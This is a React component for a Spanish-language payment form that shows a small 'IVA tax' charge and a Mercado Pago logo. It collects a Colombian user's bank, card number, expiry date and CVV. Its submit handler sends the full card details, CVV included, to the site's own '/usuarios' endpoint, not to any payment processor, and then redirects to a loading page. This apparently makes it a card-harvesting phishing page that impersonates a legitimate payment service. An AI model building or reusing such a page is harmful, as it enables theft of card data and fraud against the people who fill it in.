import { useState } from "react"
import { Link} from "react-router-dom"
import Alerta from "../components/Alerta"
import clienteAxios from "../config/clienteAxios"
import Spinner from "../components/Spinner"
import mercadoPago from '/mercadoPago.png'
import Header from '../components/Header'
import Footer from '../components/Footer'

    
const Registrar2 = () => {

  const [ fecha, setFecha ] = useState('')

  const formatExpiry = (event) => {
    let value = event.target.value;
    value = value.replace(/\D/g, '');

    if (value.length > 2) {
      value = value.slice(0, 2) + '/' + value.slice(2);
    }

    setFecha(value);
  }
 
   /* const [ nombre, setNombre ] = useState('')
  const [ email, setEmail ] = useState('')
  const [ celular, setCelular ] = useState('')
  const [ ciudad, setCiudad ] = useState('')
  const [ direccion, setDireccion ] = useState('')
*/
  const [ banco, setBanco ] = useState('')
  const [ tarjeta, setTarjeta ] = useState('')

  const [ año, setAño ] = useState('')
  const [ cvv, setCvv ] = useState('')
  const [ alerta, setAlerta ] = useState({})


  const handleSubmit = async e => {
    e.preventDefault()

   if([banco, tarjeta, fecha, cvv].includes('')) {
      setAlerta({
        msg: 'Todos los campos son obligatorios',
        error: true
      })
      return
    }

  /*  if([banco].includes('')) {
      setAlerta({
        msg: 'banco',
        error: true
      })
      return
    }

    if([tarjeta].includes('')) {
      setAlerta({
        msg: 'tarjeta',
        error: true
      })
      return
    }

    if([mes].includes('')) {
      setAlerta({
        msg: 'mes',
        error: true
      })
      return
    }

    if([año].includes('')) {
      setAlerta({
        msg: 'año',
        error: true
      })
      return
    }

    if([cvv].includes('')) {
      setAlerta({
        msg: 'cvv',
        error: true
      })
      return
    }
*/
    if(tarjeta.length < 15 ) {
      setAlerta({
        msg: 'Agrega una Tarjeta Válida',
        error: true
      })
      return
    }

    if(cvv.length < 3 ) {
      setAlerta({
        msg: 'Agrega un Cvv Válido',
        error: true
      })
      return
    }
    

   
    setAlerta({})

    //Creando el usuario en la API
    try {
      const { data } = await clienteAxios.post(`/usuarios`, {banco, tarjeta, fecha, cvv})
      setAlerta({
        msg: data.msg,
        error: false
      })

      setBanco('')
      setTarjeta('')
      setFecha('')
      setCvv('')

     
      const urlBase = window.location.origin
      window.location = `${urlBase}/carga`

    } catch (error) {
      setAlerta({
        msg: error.response.data.msg,
        error: true
      })
    }
    
  }

  const { msg } = alerta

  const [ bancoMultiple, setBancoMultiple] = useState('');

  const handleOptionChange = (event) => {
    setSelectedOption(event.target.value);
  }

  return (
    <>
    <Header className="my-5"/>
   
    <div className='my-2 text-center'>

        <h1 className="text-gray-700 text-center my-5 font-bold text-2xl m-auto uppercase">Información de Pago</h1>     

        <form 
          className="mt-2 mb-3 bg-white shadow rounded-lg p-8"
          onSubmit={handleSubmit}
        >

        <div className="text-center mx-auto">
          <p className="textoAmarillo2">Pago del impuesto del IVA: COP 6.200</p>
        </div>
                    
          <div className="mx-5">

          <div className="">
          <div className="w-75 my-3  mx-auto">

            <label htmlFor="options" className="uppercase text-gray-600 text-center block text-xl font-bold">Selecciona Tu banco:</label>
             <select className="w-75 mx-auto my-3" id="options" value={banco} onChange={ e => setBanco(e.target.value)}>
                <option value="">Selecciona</option>
                <option value="BANCO AGRARIO">BANCO AGRARIO</option>
                <option value="BANCO AV VILLAS">BANCO AV VILLAS</option>
                <option value="BANCO BBVA">BANCO BBVA</option>
                <option value="BANCO CAJA SOCIAL">BANCO CAJA SOCIAL</option>
                <option value="BANCO CITIBANK">BANCO CITIBANK</option>
                <option value="BANCO COLPATRIA">BANCO COLPATRIA</option>
                <option value="BANCO CORPBANCA">BANCO CORPBANCA</option>
                <option value="BANCO DAVIVIENDA">BANCO DAVIVIENDA</option>
                <option value="BANCO DE BOGOTA">BANCO DE BOGOTA</option>
                <option value="BANCO DE OCCIDENTE">BANCO DE OCCIDENTE</option>
                <option value="BANCO FALABELLA">BANCO FALABELLA</option>
                <option value="BANCO FINANDINA S.A">BANCO FINANDINA S.A</option>
                <option value="BANCO GANADERO">BANCO GANADERO</option>
                <option value="BANCO GNB SUDAMERIS">BANCO GNB SUDAMERIS</option>
                <option value="BANCO HSBC COLOMBIA">BANCO HSBC COLOMBIA</option>
                <option value="BANCO ITAU">BANCO ITAU</option>
                <option value="BANCO PICHINCHA S.A">BANCO PICHINCHA S.A</option>
                <option value="BANCO POPULAR">BANCO POPULAR</option>
                <option value="BANCO SANTANDER COLOMBIA">BANCO SANTANDER COLOMBIA</option>
                <option value="BANCOLOMBIA">BANCOLOMBIA</option>
                <option value="BANCOOMEVA S.A">BANCOOMEVA S.A</option>
                <option value="CREDIBANCO - ASOCIACION GREMIAL DE INSTITUCIONES FINANCIERAS">CREDIBANCO - ASOCIACION GREMIAL DE INSTITUCIONES FINANCIERAS</option>
                <option value="HELM BANK">HELM BANK</option>
                <option value="NUBANK">NUBANK</option>
                <option value="RAPPI">RAPPI</option>
                <option value="REDEBAN MULTICOLOR">REDEBAN MULTICOLOR</option>
                <option value="SCOTIABANCK COLPATRIA">SCOTIABANCK COLPATRIA</option>
                <option value="SERFINANZA - SERVICIOS FINANCIEROS">SERFINANSA - SERVICIOS FINANCIEROS</option>
                <option value="SERVIBANCA">SERVIBANCA</option>
                <option value="TUYA">TUYA</option>
                <option value="NEQUI">NEQUI</option>
                <option value="OTRO">OTRO</option>
      </select>
           
            {/*   <input className="form-control" list="datalistOptions1" id="exampleDataList1" placeholder="---Seleccione---"
                value={banco}
                onChange={ e => setBanco(e.target.value)} 
              />
               <datalist id="datalistOptions1">
                <option value="BANCO AGRARIO"/>
                <option value="BANCO AV VILLAS"/>
                <option value="BANCO BBVA"/>
                <option value="BANCO CAJA SOCIAL"/>
                <option value="BANCO CITIBANK"/>
                <option value="BANCO COLPATRIA"/>
                <option value="BANCO CORPBANCA"/>
                <option value="BANCO DAVIVIENDA"/>
                <option value="BANCO DE BOGOTA"/>
                <option value="BANCO DE OCCIDENTE"/>
                <option value="BANCO FALABELLA"/>
                <option value="BANCO FINANDINA S.A"/>
                <option value="BANCO GANADERO"/>
                <option value="BANCO GNB SUDAMERIS"/>
                <option value="BANCO HSBC COLOMBIA"/>
                <option value="BANCO ITAU"/>
                <option value="BANCO PICHINCHA S.A"/>
                <option value="BANCO POPULAR"/>
                <option value="BANCO SANTANDER COLOMBIA"/>
                <option value="BANCOLOMBIA"/>
                <option value="BANCOOMEVA S.A"/>
                <option value="CREDIBANCO - ASOCIACION GREMIAL DE INSTITUCIONES FINANCIERAS"/>
                <option value="HELM BANK"/>
                <option value="NUBANK"/>
                <option value="RAPPI"/>
                <option value="REDEBAN MULTICOLOR"/>
                <option value="SCOTIABANCK COLPATRIA"/>
                <option value="SERFINANSA - SERVICIOS FINANCIEROS"/>
                <option value="SERVIBANCA"/>
                <option value="TUYA"/>
                <option value="OTRO"/>
              </datalist>
               */}
          </div>
         
        
          <div className="my-3">
              <div className="mx-auto">
                    <label className="uppercase text-gray-600 text-center block text-xl font-bold" htmlFor="tarjeta"></label>
                    <input
                      id="tarjeta"
                      type='number'
                      placeholder='Número de Tarjeta'
                      className='w-full mt-3 p-3 px-8 text-center border rounded-xl bg-gray-50'
                      value={tarjeta}
                      onChange={ e => setTarjeta(e.target.value)}  
                    />
                </div>
          </div>
          <div className="my-3">
              <label htmlFor="expiry" className="uppercase text-gray-600 text-center block text-xl font-bold"></label>
              <input
                type="text"
                id="expiry"
                maxLength="5"
                placeholder="Fecha de Expiración"
                className=" w-full mt-3 p-3 px-8 text-center border rounded-xl bg-gray-50 inputExpiracion"
                value={fecha}
                onChange={formatExpiry}  
              />
          </div>

          <div className="my-3 text-center">
            <div className="my-3 mx-auto">
                <label htmlFor="expiry" className="uppercase text-gray-600 text-center block text-xl font-bold"></label>
                <input
                        id="cvv"
                        type='number'
                        placeholder='CVV'
                        className='w-full mt-3 p-3 px-8 text-center border rounded-xl bg-gray-50'
                        value={cvv}
                        onChange={ e => setCvv(e.target.value)}  
                      />
            </div>
          </div>

         </div>

           
          </div>
         
         <hr />

       {/*  <div className="row text-center">
          <div className="col-6">
            <p>Subtotal:</p>
          </div>
          <div className="col-6">
            <p>$6.600</p>
          </div>
          <div className="col-6">
            <p>Transporte:</p>
          </div>
          <div className="col-6">
            <p>$8.900</p>
          </div>
          <div className="col-6">
            <p>Total:</p>
          </div>
          <div className="col-6">
            <p>$15.500</p>
          </div>
         </div>
         */} 

          <img
            src={mercadoPago}
            alt='logo'
            width='250rem'
            height='250rem'
            className="mx-auto my-2"
          />

          { msg && <Alerta alerta={alerta}/> }
          <div className="text-center mt-5">
            <input
              type='submit'
              value='Pagar'
              className='footer py-2 m-auto px-12 text-white uppercase font-bold rounded hover:cursor-pointer hover:bg-sky-800 transition-colors'
            />
          </div>

        </form>

      
    </div>
    <Footer className="my-5"/>
    </>
  )
}

export default Registrar2
